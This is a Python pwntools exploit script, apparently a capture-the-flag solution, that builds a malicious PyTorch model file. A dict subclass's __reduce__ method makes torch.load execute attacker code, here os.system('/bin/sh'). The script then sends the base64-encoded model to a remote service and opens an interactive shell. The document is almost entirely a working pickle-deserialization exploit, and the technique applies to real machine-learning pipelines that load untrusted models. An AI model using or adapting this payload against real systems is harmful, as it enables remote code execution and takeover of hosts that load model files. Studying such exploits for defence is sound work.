#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template memecontrol.py --host memecontrol-1.play.hfsc.tf --port 1337
from pwn import *
import base64

exe = 'memecontrol.py'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'memecontrol-1.play.hfsc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process(['python3', exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import torch

class BadDict(dict):
    '''
    Inspired from here: https://github.com/yk/patch-torch-save
    '''

    def __init__(self, inject_src: str, **kwargs):
        super().__init__(**kwargs)
        self._inject_src = inject_src

    def __reduce__(self):
        '''
        Whenever an object is pickled, the __reduce__ method defined by it gets called. 
        This method returns either a string, which may represent the name of a Python global, 
        or a tuple describing how to reconstruct this object when unpickling.
        More on __reduce__: https://docs.python.org/3/library/pickle.html#object.__reduce__
        '''
        # return eval, (f"exec('''{self._inject_src}''') or dict()",), None, None, iter(self.items())
        return exec, (f'''{self._inject_src}''',), None, None, iter(self.items())



# Any model could be potentialy modified to execute malicious code,
# we use a dictionary to minimize the payload size.
super_ml_model = {
    "Z":"T",
    "0":"T"
}
model_file = "memecontrol.pth"

malicious_code = \
"""
import os
print("Hello from the other side! Popping a shell...")
os.system('/bin/sh')
"""

# Create a subclass dict object with our "super_model" with a specific pickling function.
# And export it as a torch model thus trigerring the pickling process.
# Once the model is loaded and unpickled the __reduce__ method will be executed,
# allowing for malicious code execution.
dict_to_save = BadDict(malicious_code, **super_ml_model)
torch.save(dict_to_save, model_file)
info(f"Exporting malicious model. Code to be executed:{malicious_code}")

with open(model_file, "rb") as model:
    b64_payload = base64.b64encode(model.read())

io = start()
print(io.recvuntil(b"Send the base64 encoded model: ").decode())
info(f"Pushing payload: {b64_payload.decode()}")
io.send(b64_payload+b"\n")
log.success(io.recvuntil(b"Hello from the other side! Popping a shell...\n").decode())
io.interactive()

